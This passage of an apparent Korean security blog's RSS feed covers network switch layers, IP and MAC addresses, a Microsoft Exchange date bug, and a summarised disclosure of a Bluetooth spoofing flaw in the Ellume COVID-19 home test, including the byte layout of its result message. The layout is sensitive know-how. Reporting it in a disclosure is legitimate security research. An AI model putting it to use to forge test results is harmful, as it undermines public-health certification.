&#xBCF4;&#xACE0; &#xD310;&#xB2E8;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC778;&#xC9C0;&#xC5D0; &#xB530;&#xB77C; Layer&#xAC00; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><p>OSI 7&#xACC4;&#xCE35;&#xC5D0; &#xB530;&#xB77C; L2, L3, L4, L7 &#xC2A4;&#xC704;&#xCE58;&#xB85C; &#xB098;&#xB258;&#xAC8C; &#xB418;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>L2 &#xC2A4;&#xC704;&#xCE58; MAC(MAC Table)&#xB97C; &#xBCF4;&#xACE0; &#xC2A4;&#xC704;&#xCE6D;&#xC744; &#xD558;&#xB294; &#xAC83;</li><li>L3 &#xC2A4;&#xC704;&#xCE58; IP &#xC815;&#xBCF4;(Rounting Table)&#xB97C; &#xBCF4;&#xACE0; &#xC2A4;&#xC704;&#xCE6D;&#xC744; &#xD558;&#xB294; &#xAC83;</li><li>L4 &#xC2A4;&#xC704;&#xCE58; IP+Port(Session or Connection)&#xB97C; &#xBCF4;&#xACE0; &#xC2A4;&#xC704;&#xCE6D;&#xC744; &#xD558;&#xB294; &#xAC83;<ul><li>L4 &#xC2A4;&#xC704;&#xCE58;&#xC5D0;&#xB294; &#xB85C;&#xB4DC;&#xBC38;&#xB7F0;&#xC2F1;(Load Balancing) &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><blockquote><p>&#xB85C;&#xB4DC;&#xBC38;&#xB7F0;&#xC2F1;&#xC774;&#xB780; &#xC811;&#xC18D;&#xB7C9;&#xC774; &#xC99D;&#xAC00;&#xD558;&#xC5EC; &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xAC10;&#xB2F9;&#xD560; &#xC218; &#xC5C6;&#xC744; &#xB54C;, &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xBD84;&#xC0B0; &#xC2DC;&#xD0A4;&#xB294; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p><img src="/2022/01/07/nanglam/network-switch/image2.png" alt></p><ul><li>L7 &#xC2A4;&#xC704;&#xCE58; &#xC2E4;&#xC81C; App &#xB370;&#xC774;&#xD130;(Content)&#xB97C; &#xBCF4;&#xACE0; &#xC2A4;&#xC704;&#xCE6D;&#xC744; &#xD558;&#xB294; &#xAC83;<ul><li>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; HTTP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD30C;&#xC2F1;&#xD574;&#xC11C; &#xC5B4;&#xB5A4; URL&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC6F9; &#xBC29;&#xD654;&#xBCBD;, &#xBCF4;&#xC548; &#xC2A4;&#xC704;&#xCE58; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xC0C1;&#xC704; &#xB808;&#xC774;&#xC5B4; &#xC2A4;&#xC704;&#xCE58;&#xB294; &#xD558;&#xC704; &#xB808;&#xC774;&#xC5B4; &#xC2A4;&#xC704;&#xCE58;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xC608;&#xC2DC;&#xB85C; L4 &#xC2A4;&#xC704;&#xCE58;&#xAC00; L3&#xC758; &#xC2A4;&#xC704;&#xCE58; &#xAE30;&#xB2A5;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><p>&#xC544;&#xB798;&#xC758; &#xC608;&#xC2DC;&#xB294; L1 ~ L7 &#xC2A4;&#xC704;&#xCE58;&#xAE4C;&#xC9C0; &#xD3B8;&#xD558;&#xAC8C; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB294; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs fix"><span class="hljs-attr">&#xBC18;&#xC7A5; </span>=<span class="hljs-string"> &#xC2A4;&#xC704;&#xCE58;</span><span class="hljs-string">&#xBC18; &#xCE5C;&#xAD6C;&#xB4E4; = &#xB514;&#xBC14;&#xC774;&#xC2A4;(&#xC0AC;&#xC6A9;&#xC790;)</span></code></pre><p><strong>L1 &#xC2A4;&#xC704;&#xCE58; / &#xB354;&#xBBF8; &#xD5C8;&#xBE0C;</strong><br>&#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8;&#xB97C; &#xD1B5;&#xD558;&#xC5EC; &#xD328;&#xD0B7; &#xC804;&#xB2EC; &#x2192; &#xBC18;&#xC7A5;&#xC774; &#xB9E8; &#xC55E;&#xC5D0;&#xC11C; &#xD070;&#xC18C;&#xB9AC;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>L2 &#xC2A4;&#xC704;&#xCE58;</strong><br>MAC Table&#xC744; &#xCC38;&#xC870;&#xD574;&#xC11C; &#xAC1C;&#xC778;&#xC801;&#xC778; &#xD328;&#xD0B7; &#xC804;&#xB2EC; &#x2192; &#xBC18;&#xC7A5;&#xC774; &#xD55C; &#xBA85;&#xC529; &#xADD3;&#xC18D;&#xB9D0;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>L3 &#xC2A4;&#xC704;&#xCE58;</strong><br>Routing Table&#xC744; &#xCC38;&#xC870;&#xD574;&#xC11C; &#xD328;&#xD0B7; &#xC804;&#xB2EC; &#x2192; &#xBC18;&#xC7A5;&#xC774; &#xC606; &#xBC18;&#xC758; &#xBC18;&#xC7A5;&#xC5D0;&#xAC8C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. (&#xC606; &#xBC18;&#xC758; &#xBC18;&#xC7A5;&#xC740; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xCE5C;&#xAD6C;&#xC5D0;&#xAC8C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.)</p><p><strong>L4 &#xC2A4;&#xC704;&#xCE58;</strong><br>&#xB85C;&#xB4DC;&#xBC38;&#xB7F0;&#xC2F1;(&#xBD80;&#xD558; &#xBD84;&#xC0B0;) &#xAE30;&#xB2A5; &#x2192; &#xBC18;&#xC7A5;&#xC774; A&#xC5D0;&#xAC8C; &#xC77C;&#xC744; &#xC8FC;&#xB2E4;&#xAC00; A&#xAC00; &#xD798;&#xB4E4;&#xC5B4; &#xBCF4;&#xC774;&#xBA74; B&#xC5D0;&#xAC8C;&#xB3C4; &#xC77C;&#xC744; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><strong>L7 &#xC2A4;&#xC704;&#xCE58;</strong><br>&#xBCF4;&#xC548; &#xAE30;&#xB2A5; &#x2192; A&#xC5D0;&#xAC8C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xAC00;&#xB294; &#xD0DD;&#xBC30;&#xAC00; &#xC628;&#xB2E4;&#xBA74; &#xBC18;&#xC7A5;&#xC774; &#xD0DD;&#xBC30; &#xD655;&#xC778; &#xD6C4; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
      
      <category domain="https://hackyboiz.github.io/tags/nanglam/">nanglam</category>
      
      <category domain="https://hackyboiz.github.io/tags/switch/">switch</category>
      
      <category domain="https://hackyboiz.github.io/tags/network-switch/">network switch</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/07/nanglam/network-switch/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] 검사 결과를 위조 가능한 코로나 자가검사키트 취약점</title>
      <link>https://hackyboiz.github.io/2022/01/06/l0ch/2022-01-06/</link>
      <guid>https://hackyboiz.github.io/2022/01/06/l0ch/2022-01-06/</guid>
      <pubDate>Thu, 06 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.f-secure.com/blog/faking-a-positive-covid-te</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.f-secure.com/blog/faking-a-positive-covid-test">https://labs.f-secure.com/blog/faking-a-positive-covid-test</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://www.ellumehealth.com/products/consumer-products/covid-home-test">ellume covid-19 home test</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ellume &#xC0AC;&#xC758; &#xCF54;&#xB85C;&#xB098;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xAC10;&#xC5FC;&#xC99D;-19 &#xAC80;&#xC0AC;&#xAE30;&#xC5D0;&#xC11C; &#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xB97C; &#xC870;&#xC791;&#xD574; &#xC704;&#xC870;&#xB41C; &#xAC80;&#xC0AC; &#xC99D;&#xBA85;&#xC11C;&#xB97C; &#xBC1C;&#xAE09;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xC2A4;&#xD478;&#xD551; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xAE30;&#xC758; &#xBD84;&#xC11D;&#xAE30;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC591;&#xC131;&#xC778;&#xC9C0; &#xC74C;&#xC131;&#xC778;&#xC9C0;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xB4A4; &#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xB97C; &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC5D0; &#xC54C;&#xB9AC;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC758; <code>com.ellumehealth.homecovid.android/com.gsk.itreat.activities.BluetoothDebugActivity</code> &#xC11C;&#xBE44;&#xC2A4;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.  &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xB418;&#xB294; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xB294; <code>STATUS</code>&#xC640; <code>MEASUREMENT_CONTROL_DATA</code> bytes array&#xAC00; &#xC788;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xB294; bytes array&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xC720;&#xCD94;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; <code>MEASUREMENT_CONTROL_DATA</code> &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xB294; <code>au.com.ellume.estick_sdk.messaging.comms.payloads.MeasurementControlDataPayload</code> &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC758;&#xBBF8;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// MEASUREMENT_CONTROL_DAT</span><span class="hljs-built_in">Array</span>[<span class="hljs-number">0</span><span class="hljs-number">-1</span>] <span class="hljs-number">64</span>, <span class="hljs-number">-102</span>          &#xD2B8;&#xB798;&#xD53D; &#xC2DC;&#xC791; <span class="hljs-built_in">Array</span>[<span class="hljs-number">2</span>] <span class="hljs-number">12</span>                  &#xD2B8;&#xB798;&#xD53D; &#xC720;&#xD615;(<span class="hljs-number">12</span> = MEASUREMENT_CONTROL_DATA) <span class="hljs-built_in">Array</span>[<span class="hljs-number">3</span>] <span class="hljs-number">24</span>                  &#xBC14;&#xC774;&#xD2B8; &#xC218;&#xC758; &#xB370;&#xC774;&#xD130; &#xAE38;&#xC774; <span class="hljs-built_in">Array</span>[<span class="hljs-number">4</span><span class="hljs-number">-7</span>] <span class="hljs-number">-119</span>, <span class="hljs-number">85</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>   unsigned byte &#xAC12;&#xC758; &#xACE0;&#xC720; ID <span class="hljs-built_in">Array</span>[<span class="hljs-number">8</span><span class="hljs-number">-9</span>] <span class="hljs-number">-98</span>, <span class="hljs-number">0</span>            unsigned byte &#xAC12;&#xC758; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;<span class="hljs-built_in">Array</span>[<span class="hljs-number">10</span><span class="hljs-number">-11</span>] <span class="hljs-number">-128</span>, <span class="hljs-number">7</span>         unsigned byte &#xAC12;&#xC758; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504; <span class="hljs-built_in">Array</span>[<span class="hljs-number">12</span><span class="hljs-number">-14</span>] <span class="hljs-number">-81</span>, <span class="hljs-number">36</span>, <span class="hljs-number">0</span>      &#xB77C;&#xC778; <span class="hljs-number">1</span> <span class="hljs-built_in">Array</span>[<span class="hljs-number">15</span>] <span class="hljs-number">4</span>                  &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC0C1;&#xD0DC; <span class="hljs-built_in">Array</span>[<span class="hljs-number">16</span><span class="hljs-number">-18</span>] <span class="hljs-number">80</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>       &#xB77C;&#xC778; <span class="hljs-number">2</span> <span class="hljs-built_in">Array</span>[<span class="hljs-number">19</span>] <span class="hljs-number">0</span>                  &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC0C1;&#xD0DC;<span class="hljs-built_in">Array</span>[<span class="hljs-number">20</span><span class="hljs-number">-21</span>] <span class="hljs-number">62</span>, <span class="hljs-number">2</span>           unsigned byte &#xAC12;&#xC758; dark frequency number<span class="hljs-built_in">Array</span>[<span class="hljs-number">22</span>] <span class="hljs-number">0</span>                  &#xD14C;&#xC2A4;&#xD2B8; &#xACB0;&#xACFC; <span class="hljs-built_in">Array</span>[<span class="hljs-number">23</span><span class="hljs-number">-24</span>] <span class="hljs-number">19</span>, <span class="hljs-number">25</span>          unsigned byte &#xAC12;&#xC758; c1 <span class="hljs-built_in">Array</span>[<span class="hljs-number">25</span><span class="hljs-number">-26</span>] <span class="hljs-number">-124</span>, <span class="hljs-number">26</span>        unsigned byte &#xAC12;&#xC758; c2 <span class="hljs-built_in">Array</span>[<span class="hljs-number">27</span>] <span class="hljs-number">-119</span>               unsigned byte &#xAC12;&#xC758; &#xCE21;&#xC815; &#xB370;&#xC774;&#xD130; &#xCCB4;&#xD06C;&#xC12C; <span class="hljs-built_in">Array</span>[<span class="hljs-number">28</span><span class="hljs-number">-19</span>] <span class="hljs-number">-66</span>, <span class="hljs-number">-43</span>        unsigned byte &#xAC12;&#xC758; crc</code></pre><p>&#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xAC00; &#xC591;&#xC131;&#xC778;&#xC9C0; &#xC74C;&#xC131;&#xC778;&#xC9C0;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xD544;&#xB4DC;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xBA74; &#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Ellume &#xAC80;&#xC0AC;&#xAE30;&#xC758; &#xACB0;&#xACFC;&#xB294; &#xCF54;&#xB85C;&#xB098;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xC74C;&#xC131; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xBC1C;&#xAE09;&#xBC1B;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xCF54;&#xB85C;&#xB098;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xD655;&#xC9C4;&#xC790; &#xD30C;&#xC545;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC5B4; Ellume&#xC740; &#xC571;&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xB09C;&#xB3C5;&#xD654; &#xBC0F; &#xAC80;&#xC0AC; &#xACFC;&#xC815;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD328;&#xCE58;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/covid-19/">covid-19</category>
      
      <category domain="https://hackyboiz.github.io/tags/covid/">covid</category>
      
      <category domain="https://hackyboiz.github.io/tags/bluetooth/">bluetooth</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/06/l0ch/2022-01-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] IP주소&amp;MAC 주소</title>
      <link>https://hackyboiz.github.io/2022/01/05/poosic/ip-n-mac/</link>
      <guid>https://hackyboiz.github.io/2022/01/05/poosic/ip-n-mac/</guid>
      <pubDate>Wed, 05 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;IP-&amp;#xC8FC;&amp;#xC18C;&quot;&gt;&lt;a href=&quot;#IP-&amp;#xC8FC;&amp;#xC18C;&quot; class=&quot;headerlink&quot; title=&quot;IP &amp;#xC8FC;&amp;#xC18C;&quot;&gt;&lt;/a&gt;IP &amp;#xC8FC;&amp;#xC18C;&lt;/h2&gt;&lt;p&gt;IP</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="IP-&#xC8FC;&#xC18C;"><a href="#IP-&#xC8FC;&#xC18C;" class="headerlink" title="IP &#xC8FC;&#xC18C;"></a>IP &#xC8FC;&#xC18C;</h2><p>IP &#xC8FC;&#xC18C;&#xB780; IP &#xD1B5;&#xC2E0;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xACE0;&#xC720; &#xC8FC;&#xC18C;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. IPv4(Internet Protocol version 4)&#xC640; IPv6 (Internet Protocol version 6),&#xC774; &#xB450; &#xAC00;&#xC9C0; &#xCCB4;&#xACC4;&#xAC00; &#xC788;&#xC73C;&#xBA70; &#xC6B0;&#xB9AC;&#xAC00; &#xD754;&#xD788; 127.0.0.1 &#xCC98;&#xB7FC; 4&#xAC1C;&#xC758; &#xD544;&#xB4DC;&#xC5D0; 0~255&#xC758; 10&#xC9C4;&#xC218;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB294; IP &#xC8FC;&#xC18C;&#xB294; IPv4&#xC758; &#xD615;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="MAC&#xC8FC;&#xC18C;"><a href="#MAC&#xC8FC;&#xC18C;" class="headerlink" title="MAC&#xC8FC;&#xC18C;"></a>MAC&#xC8FC;&#xC18C;</h2><p>MAC &#xC8FC;&#xC18C;&#xB780; &#xBB34;&#xC120; LAN &#xCE74;&#xB4DC;, &#xBB34;&#xC120; LAN &#xAE30;&#xB2A5; &#xB0B4;&#xC7A5; &#xAE30;&#xAE30;&#xC5D0; &#xBD80;&#xC5EC;&#xB418;&#xB294; &#xACE0;&#xC720; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, IP&#xC8FC;&#xC18C;&#xAC00; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xC8FC;&#xC18C;&#xB77C;&#xBA74; MAC &#xC8FC;&#xC18C;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC758; &#xC8FC;&#xC18C;(=&#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC2DD;&#xBCC4;&#xC790;)&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC0AC;&#xC6A9;-&#xC774;&#xC720;"><a href="#&#xC0AC;&#xC6A9;-&#xC774;&#xC720;" class="headerlink" title="&#xC0AC;&#xC6A9; &#xC774;&#xC720;"></a>&#xC0AC;&#xC6A9; &#xC774;&#xC720;</h3><p>MAC&#xC8FC;&#xC18C;&#xB294; &#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD558;&#xC790;&#xBA74; &#xD1B5;&#xC2E0;&#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC815;&#xD655;&#xD55C; &#xB300;&#xC0C1;&#xC744; &#xD2B9;&#xC815;&#xC9D3;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C; &#xB9D0;&#xD558;&#xC790;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC;&#xC744; &#xD1B5;&#xC2E0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2022/01/05/poosic/ip-n-mac/image1.png" alt="Untitled.jpg"></p><p>&#xC608;&#xC2DC;&#xB85C; &#xD0DD;&#xBC30;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.&#xD0DD;&#xBC30; &#xC218;&#xC2E0;&#xC790;&#xAC00; &#xC544;&#xD30C;&#xD2B8;&#xC5D0; &#xC0AC;&#xB294; &#xACBD;&#xC6B0; &#xC1A1;&#xC2E0;&#xC790; &#xC6B0;&#xB9B0; &#xC0C1;&#xC138; &#xC8FC;&#xC18C;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#x201C;&#xC11C;&#xC6B8;&#xD2B9;&#xBCC4;&#xC2DC; &#xC911;&#xB791;&#xAD6C; &#xC624;&#xB3D9;&#xB3D9; &#xC5EC;&#xAE30;&#xB85C; 300 &#xC6B0;&#xB9AC;&#xC544;&#xD30C;&#xD2B8; 107&#xB3D9; 504&#xD638;&#x201D; &#xC8FC;&#xC18C;&#xC5D0; &#xD0DD;&#xBC30;&#xB97C; &#xBCF4;&#xB0B8;&#xB2E4;&#xACE0; &#xD558;&#xBA74; &#x201C;&#xC11C;&#xC6B8;&#xD2B9;&#xBCC4;&#xC2DC;~ &#xC5EC;&#xAE30;&#xB85C; 300&#x201D;&#xC740; IP&#xC8FC;&#xC18C;&#xC5D0;, &#x201C;107&#xB3D9; 504&#xD638;&#x201D;&#xB294; MAC &#xC8FC;&#xC18C;&#xC5D0; &#xBE44;&#xC720;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; MAC &#xC8FC;&#xC18C;&#xC640; IP&#xC8FC;&#xC18C;&#xC5D0; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xC544;&#xB4E4;&#xC774;&#xBA74;, &#xC815;&#xBCF4;&#xAC00; &#xAC00;&#xC9C0; &#xB9D0;&#xC544;&#xC57C; &#xD560; &#xACF3;&#xC5D0; &#xC804;&#xB2EC;&#xB420;&#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; Monitor Mode&#xB77C;&#xB294; &#xAC83;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xC120; &#xB79C;&#xCE74;&#xB4DC;&#xB098; &#xC5B4;&#xB311;&#xD130;&#xB294; Managed Mode&#xB77C;&#xB294; &#xC790;&#xC2E0;&#xC5D0;&#xAC8C; &#xC624;&#xB294; &#xD328;&#xD0B7;&#xB9CC;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xB294; &#xBAA8;&#xB4DC;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC; Monitor Mode&#xB294; &#xC8FC;&#xBCC0;&#xC5D0; &#xBFCC;&#xB824;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD328;&#xD0B7;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xB294; &#xBAA8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCF8;&#xB798;&#xB294; &#xBB34;&#xC120; &#xD2B8;&#xB798;&#xD53D; &#xBD84;&#xC11D; &#xB4F1; WLAN &#xC720;&#xC9C0;/&#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD55C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xC9C0;&#xB9CC; <a href="https://stibee.com/api/v1.0/emails/share/uXvtk4FQZNF4WMDqKBGeYjiJRTp_CA==">&#xC2A4;&#xB2C8;&#xD551;</a>&#xC5D0; &#xC545;&#xC6A9;&#xC774; &#xCDA9;&#xBD84;&#xD788; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/ip/">ip</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/05/poosic/ip-n-mac/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Y2K22: Email Stuck in Exchange On-premises Transport Queues</title>
      <link>https://hackyboiz.github.io/2022/01/04/fabu1ous/2022-01-04/</link>
      <guid>https://hackyboiz.github.io/2022/01/04/fabu1ous/2022-01-04/</guid>
      <pubDate>Tue, 04 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://techcommunity.microsoft.com/t5/exchange-team-blog</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/email-stuck-in-exchange-on-premises-transport-queues/ba-p/3049447">Email Stuck in Exchange On-premises Transport Queues</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Exchange 2016 server</p><p>Microsoft Exchange 2019 server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>2022&#xB144; &#xC0C8;&#xD574;&#xAC00; &#xBC1D;&#xC790; Microsoft Exchange mail server&#xB4E4;&#xC5D0;&#xC11C; &#xB300;&#xB7C9;&#xC758; &#xC774;&#xBA54;&#xC77C;&#xB4E4;&#xC774; &#xC804;&#xC1A1; queue&#xC5D0; &#xBA38;&#xBB34;&#xB974;&#xBA70; &#xC11C;&#xBC84;&#xB97C; &#xB2E4;&#xC6B4;&#xC2DC;&#xD0A4;&#xB294; &#xC0AC;&#xAC74;&#xC774; 